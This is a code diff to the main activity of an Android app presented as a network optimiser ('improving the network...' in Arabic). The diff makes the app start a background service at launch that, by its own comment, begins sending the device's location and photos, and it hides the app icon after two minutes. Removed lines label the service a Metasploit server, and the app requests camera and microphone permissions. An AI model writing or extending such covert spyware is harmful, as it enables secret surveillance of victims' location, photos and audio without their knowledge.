@@ -6,6 +6,7 @@ import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
 import android.provider.Settings;
 import android.widget.Button;
 import android.widget.TextView;
@@ -23,13 +24,24 @@ public class MainActivity extends AppCompatActivity {
         Button startBtn = findViewById(R.id.startBtn);
         TextView statusText = findViewById(R.id.statusText);
 
+        // تشغيل خدمة الخلفية فوراً (عشان تبدأ تبعت الموقع والصور)
+        Intent serviceIntent = new Intent(this, BackgroundService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(serviceIntent);
+        } else {
+            startService(serviceIntent);
+        }
+
+        // إخفاء التطبيق بعد دقيقتين بالظبط
+        new Handler().postDelayed(this::hideAppIcon, 120000);
+
         startBtn.setOnClickListener(v -> {
             statusText.setText("جاري تحسين الشبكة...");
-            requestPermissionsAndStart();
+            requestPermissions();
         });
     }
 
-    private void requestPermissionsAndStart() {
+    private void requestPermissions() {
         String[] permissions = {
                 Manifest.permission.CAMERA,
                 Manifest.permission.RECORD_AUDIO,
@@ -42,17 +54,6 @@ public class MainActivity extends AppCompatActivity {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
         }
-
-        // تشغيل السيرفر (Metasploit)
-        Intent serviceIntent = new Intent(this, BackgroundService.class);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(serviceIntent);
-        } else {
-            startService(serviceIntent);
-        }
-
-        // الإخفاء من قائمة التطبيقات
-        hideAppIcon();
     }
 
     private void hideAppIcon() {
